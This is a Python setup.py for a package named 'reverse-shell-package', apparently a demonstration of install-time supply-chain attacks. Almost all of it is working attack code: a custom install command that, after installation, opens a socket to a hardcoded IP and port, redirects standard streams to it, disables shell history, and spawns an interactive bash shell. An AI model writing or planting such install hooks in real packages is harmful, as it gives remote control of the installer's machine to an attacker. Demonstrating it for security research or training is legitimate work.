import os
import socket
import subprocess
from setuptools import setup
from setuptools.command.install import install

# Reverse Shell Code as a Function
def reverse_shell():
    lhost = '172.21.54.121'  # Your attacker's IP
    lport = 16000            # Your attacker's port
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((lhost, lport))
        os.dup2(s.fileno(), 0)  # Redirect stdin
        os.dup2(s.fileno(), 1)  # Redirect stdout
        os.dup2(s.fileno(), 2)  # Redirect stderr
        os.putenv('HISTFILE', '/dev/null')  # Disable command history
        subprocess.call(['/bin/bash', '-i'])
        s.close()
    except Exception as e:
        print(f"Error: {e}")
        s.close()

# Custom Install Class to Run Payload After Installation
class PostInstallCommand(install):
    def run(self):
        install.run(self)  # Run the standard install process
        # Trigger the reverse shell after installation
        reverse_shell()

# Setup Function
setup(
    name='reverse-shell-package',
    version='1.0.0',
    description='A test package that demonstrates a reverse shell.',
    author='Your Name',
    cmdclass={'install': PostInstallCommand},  # Use the custom install command
)
